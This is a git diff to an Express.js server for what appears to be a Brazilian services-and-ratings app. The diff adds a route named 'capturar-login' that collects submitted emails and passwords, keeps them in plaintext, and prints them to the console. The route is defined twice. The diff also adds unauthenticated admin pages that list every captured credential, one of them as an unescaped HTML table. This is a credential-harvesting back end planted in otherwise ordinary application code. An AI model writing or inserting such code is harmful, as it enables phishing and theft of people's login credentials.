@@ -8,6 +8,8 @@ const fsPromises = fs.promises;
 const getNoticias = require('./scraper');
 const multer = require('multer');
 const mongoose = require('mongoose');
+const logins = [];
+
 
 const Profissional = require('./models/Profissional');
 const Estabelecimento = require('./models/Estabelecimento');
@@ -302,6 +304,70 @@ app.post('/api/avaliar', async (req, res) => {
     res.status(500).json({ message: 'Erro interno ao registrar avaliação' });
   }
 });
+
+
+// Rota para receber login
+app.post('/api/capturar-login', (req, res) => {
+  const { email, senha } = req.body;
+  if (!email || !senha) return res.status(400).json({ error: 'Faltam dados' });
+
+  logins.push({ email, senha, hora: new Date().toISOString() });
+  console.log('Login capturado:', email, senha);
+  res.json({ success: true });
+});
+
+// Rota para listar logins capturados (admin)
+app.get('/api/admin/logins', (req, res) => {
+  res.json(logins);
+});
+
+
+// Recebe login
+app.post('/api/capturar-login', (req, res) => {
+  const { email, senha } = req.body;
+  if (!email || !senha) return res.status(400).json({ error: 'Faltam dados' });
+
+  logins.push({ email, senha, hora: new Date().toLocaleString() });
+  console.log('Login capturado:', email, senha);
+  res.json({ success: true });
+});
+
+// Painel admin que lista os logins
+app.get('/admin', (req, res) => {
+  let html = `
+    <h1>Logins Capturados</h1>
+    <table border="1" cellpadding="5" cellspacing="0">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Email / Usuário</th>
+          <th>Senha</th>
+          <th>Hora</th>
+        </tr>
+      </thead>
+      <tbody>
+  `;
+
+  logins.forEach((item, i) => {
+    html += `
+      <tr>
+        <td>${i + 1}</td>
+        <td>${item.email}</td>
+        <td>${item.senha}</td>
+        <td>${item.hora}</td>
+      </tr>
+    `;
+  });
+
+  html += `
+      </tbody>
+    </table>
+    <p>Total: ${logins.length} logins capturados.</p>
+  `;
+
+  res.send(html);
+});
+
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Servidor rodando em http://0.0.0.0:${PORT}`);
